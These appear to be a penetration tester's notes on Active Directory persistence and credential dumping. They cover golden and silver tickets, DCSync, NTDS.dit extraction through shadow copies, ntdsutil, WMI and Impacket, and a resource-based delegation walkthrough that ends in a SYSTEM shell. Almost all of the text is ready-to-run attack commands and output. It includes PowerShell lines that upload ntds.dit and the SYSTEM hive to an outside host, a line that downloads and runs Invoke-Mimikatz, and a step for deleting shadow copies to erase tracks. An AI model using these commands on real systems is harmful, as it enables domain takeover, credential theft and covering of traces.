## Persistence

With krbtgt, We can create a Golden ticket.

### Links

- [LSA Dump](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)

```
# Initial location of the NTDS database on the domain controller
C:\Windows\NTDS\NTDS.dit

# Step 1 → Finding a way to get the NDTS.dis and SYSTEM file
# Step 2 → Crack/Analyze offline
```
### Golden Ticket Attack

```
# Assuming that Victim account is member of Domain Admin or we have compromised the DC.
# Let's extract pass hash of krbtgt account with mimikatz.

mimikatz
privilege::debug
lsadump::lsa /patch # Look for User:krbtgt and it's NTLM Hash.

kerberos::purge
kerberos::golden /user:<TOPI> /domain:<domain_name> /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:<NTLM hash> /ptt
# This is allowed because DC trusts anything which is encrytped by krbtgt pass hash.

misc::cmd
psexec.exe \\dc01 cmd.exe # Lateral movement to DC.
whoami
whoami /groups
```

### DCSync Attack

```
DSync (Domain Controller Synchronization) -> Steal Pass hashes of all Admin Users in Domain.

Methods:
1) Laterally move to DC and run mimikatz to dump pass hash of every user.
2) Steal ntdis.dit from DC.
3) Above 2 requires tool upload and can get caught so we use 3rd method to abuse DC's functionality.
# Login with a Local admin priv account and run mimikatz.

mimikatz
lsadump::dcsync /user:Administrator # Administrator is target account.


impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.205.70

```

We can request a replication update with a DC and obtain the pass hashes of every account in Active Directory without ever logging in to the domain controller.


### Other Notes

### Silver Tickets
```
iwr -UseDefaultCredentials http://web04
privilege::debug
sekurlsa::logonpasswords

whoami /user

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
exit


klist
iwr -UseDefaultCredentials http://web04 | findstr /i OS{
(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"



```

### Shadow Copies
```
*Shadow Copies*

vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL



powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\ntds.dit.bak')"


powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\system.bak')"
```




### Ticket generation from Linux

```
# Generate a ticket or convert it (kekeo) to ccache format
ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> <user>

# Export the path in the right variable
export KRB5CCNAME=/tmp/ticket.ccache
klist

# Exec and use the ticket
/impacket/examples/psexec.py -k -n -debug DOMAIN/user@host

# Dump NTDS
proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss

```

### Golden Ticket

```
# Golden Ticket
> Nom du compte administrateur (Administrateur)
> Nom complet du domaine (domain.local)
> SID du domaine (S-1-5-21-1723555596-1415287819-2705645101) [whoami /user]
> Hash NTLM du compte krbtgt (6194bd1a5bf3ecd542e8aac9860bddf0)

mimikatz # privilege:debug
mimikatz # lsadump::lsa /inject /name:krbtgt

mimikatz # kerberos::golden /admin:Administrateur /domain:domain.local /sid:S-1-5-21-1723555596-1415287819-2705645101 /krbtgt:6194bd1a5bf3ecd542e8aac9860bddf0 /ticket:domain.local.kirbi /id:500 /ptt

Use :
mimikatz # kerberos::ptt domain.local.kirbi
mimikatz # kerberos::list



# Resource
https://twitter.com/mpgn_x64/status/1241688547037532161

# Golden ticket and access denied ?
# from cmd (elevated)
> mimikatz kerberos::golden
> klist add_bind <DOMAIN> <DC>
> psexec \\dc\ cmd


```

### Playing with tickets on Windows

```
# Sessions en cours
mimikatz # sekurlsa::logonpasswords

# Ticket TGT
# Dump SPN
PS C:\> Find-PSServiceAccounts -DumpSPN
Discovering service account SPNs in the AD Domain foo.local
svcSQLServ/pc1.foo.local:1433

# Download Mimikatz
PS C:\> Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
PS C:\> Invoke-Mimikatz
mimikatz(powershell) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

# Lister les tickets actifs ou les purger
PS C:\> Invoke-Mimikatz -Command '"kerberos::purge"'
PS C:\> Invoke-Mimikatz -Command '"kerberos::list"'
PS C:\> klist

# Demander un ticket
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "svcSQLServ/pc1.foo.local:1433"

# Exporter un ticket
mimikatz # kerberos::list /export

# Crack Ticket
python tgsrepcrack.py wordlist.txt ticket.kirbi

```

### Local Extraction
##### VSSadmin

```
# Récupération via VSSadmin
# Create a Volume Shadow Copy
C:\Windows\system32> vssadmin create shadow /for=C:

# Retrieve NTDS from the copy
C:\Windows\system32> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit c:\Extract\ntds.dit

# Copy SYSTEM file
C:\Windows\system32> reg SAVE HKLM\SYSTEM c:\Extract\SYS
C:\Windows\system32> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM c:\Extract\SYSTEM

# Delete tracks
C:\Windows\system32> vssadmin delete shadows /shadow={uuid}

# Trick if you are on a semi-interactive shell
# You can specify /quiet option to not get the prompt
# Can be usefull for deletion (as it require to confirm)
vssadmin delete shadows /shadow={uuid} /quiet

```

##### ntdsutil tool

```
# ntdsutil is a builtin tool used to manage the AD
# You can abuse it and create a backup of the ntds.dit file
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit

```

##### DC Sync / Mimikatz

```
# DC Sync is a less noisy way to extract users informations
# It uses the DRS (Directory Replication Service)

# Classic
mimikatz # lsadump::dcsync /domain:domain.lan /all /csv

# Specific user
mimikatz # lsadump::dcsync /domain:domain.lan /user:test

```

##### PowerSploit

```
# PowerSploit contains a script using the volume shadow copy service
Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy 

# Also possible through a meterpreter session
powershell_shell
New-VolumeShadowCopy -Volume C:\
Get-VOlumeShadowCopy

```

##### Invoke-DCSync

```
# Powershell script
# Leverages PowerView, Invoke-ReflectivePEInjection and a DLL wrapper of PowerKatz
Invoke-DCSync

# Get other format (user:id:lm:ntlm)
Invoke-DCSync -PWDumpFormat

# It is also possible through a meterpreter session

```

##### Nishang

```
# Nishang is a post exploitation framework allowing attacker to perform attacks
# You can use the Copy-VSS script to get NTDS.dit, SAM and SYSTEM files
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\

# You can also use them throught a meterpretrer session by loading the powershell extension
load powershell
powershell_import /root/Copy-VSS.ps1
powershell_execute Copy-VSS

# Also possible to establish a direct connection
powershell_shell
PS > Copy-VSS
PS > Copy-VSS -DestinationDir C:\Ninja

```

### Remote Extraction

##### CrackMapExec
```
crackmapexec xxx.xxx.xxx.xxx -u login -p password -d domain --ntds drsuapi
```
##### WMI - Remote

```
# It is possible to remotely extract the NTDS database using WMI and VSSADMIN
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"

```

#### Impacket

```

python secretsdump.py -history -user-status -just-dc-user Administrateur -just-dc-ntlm foo.local/administrateur:P4ssw0rd\!@DC1.FOO.LOCAL

python secretsdump.py -history -user-status -just-dc-user krbtgt -just-dc-ntlm foo.local/administrateur:P4ssw0rd\!@DC1.FOO.LOCAL



```

##### NTDS Extraction and analysis

```
# Impacket provides a usefull script to do that (decrypt copied files)
impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit DOMAIN

# Also possible to dump it remotely by using the computer account and its hash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1

# Extraction is also possible using NTDSDumpEx
NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive

# Or adXtract
./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab

```

##### Empire

```
# Empire has 2 modules you can use to retrieve hashes through DCSync
usemodule credentials/mimikatz/dcsync_hashdump
usemodule credentials/mimikatz/dcsync

```


### Resource Based Constrained Delegation

Let's use our access with the `l.livingstone` account to create a new machine account on the domain. We can do with by using `impacket-addcomputer`.

```
┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
```

We can verify that this machine account was added to the domain by using our `evil-winrm` session from before.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer attack


DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : ATTACK
ObjectClass       : computer
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9
SamAccountName    : ATTACK$
SID               : S-1-5-21-537427935-490066102-1511301751-3601
UserPrincipalName :
```

With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) and use it to set `msDS-AllowedToActOnBehalfOfOtherIdentity` on our new machine account.

```
┌──(kali㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  
...
┌──(kali㉿kali)-[~]
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.120.181
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

We can confirm that this was successful by using our `evil-winrm` session.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators resourced\ATTACK$ Allow
```

We now need to get the administrator service ticket. We can do this by using `impacket-getST` with our privileged machine account.

```
┌──(kali㉿kali)-[~]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

This saved the ticket on our Kali host as **Administrator.ccache**. We need to export a new environment variable named `KRB5CCNAME` with the location of this file.

```
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=./Administrator.ccache
```

Now, all we have to do is add a new entry in **/etc/hosts** to point `resourcedc.resourced.local` to the target IP address and run `impacket-psexec` to drop us into a system shell.

```
┌──(kali㉿kali)-[~]
└─$ sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" >> /etc/hosts'

┌──(kali㉿kali)-[~]
└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file zZeQFeGQ.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service rEwK on resourcedc.resourced.local.....
[*] Starting service rEwK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.
 
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

